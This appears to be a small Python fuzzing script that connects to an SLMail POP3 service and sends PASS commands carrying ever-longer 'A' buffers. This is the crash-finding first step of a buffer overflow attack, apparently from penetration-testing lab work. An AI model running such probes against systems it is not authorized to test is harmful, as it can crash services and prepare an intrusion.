#!/usr/bin/python3
# -*- coding: utf-8 -*-
""" fuzzer.py

Fuzz things

"""

from __future__ import division, print_function, absolute_import

import logging
import socket

__author__ = "Derek Goddeau"

_logger = logging.getLogger(__name__)


def fuzz(ip, ports, size, increment):
    """ Send increasingly longer buffers to a socket

    Currently only configured for SLMail
    
    """
    buff = setup_buffers(size, increment)

    for port in ports:

        for string in buff:

            print("[*] Fuzzing Pass with {} bytes".format(len(string)))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(600)

            try:
                s.connect((ip, port))
                s.recv(1024)
                s.send('USER test\r\n')
                s.recv(1024)
                s.send('PASS ' + string + '\r\n')
                s.send('QUIT\r\n')
            except socket.timeout:
                print("[**] ERROR: timeout waiting for reply aborting")
                s.close()
                break
            except socket.error:
                print("[**] ERROR: cannot connect to IP {}:{}".format(ip, port))
                s.close()
                break

            s.close()


def setup_buffers(size, increment):
    """ Create an array of buffers, from 1 to size, with set increment from 100.

    """
    buff = ["A"]
    counter = 100
    while len(buff) <= size/increment:
        buff.append("A" * counter)
        counter = counter + increment

    return buff
